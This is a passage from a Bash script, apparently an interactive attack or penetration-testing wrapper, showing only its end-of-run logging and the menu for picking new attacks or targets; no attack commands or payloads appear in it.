        log_full_action "TARGET COMPLETE" "Finished $target_ip | Total Time: $target_duration"
    done

    echo -e "${BLUE}=============================================${NC}"
    echo -e "${GREEN}[✓] All operations complete. Logged to $SESSION_DIR${NC}"

    echo -e "\n${YELLOW}--- Task Complete ---${NC}"
    echo -e "${GRAY}1)${NC} Continue (Select new attack or targets)"
    echo -e "${RED}2) Exit${NC}"
    read -p "> " next_move

    if [[ "$next_move" == "2" ]]; then cleanup_and_exit; fi

    echo -e "\n${YELLOW}--- Target Selection ---${NC}"
    echo -e "${GRAY}1)${NC} Keep Current Target List"
    echo -e "${GRAY}2)${NC} Select New Target(s)"
    read -p "> " ip_decision

    if [[ "$ip_decision" == "2" ]]; then
        select_target
    else
        echo -e "${CYAN}[*] Target list preserved.${NC}"
    fi
done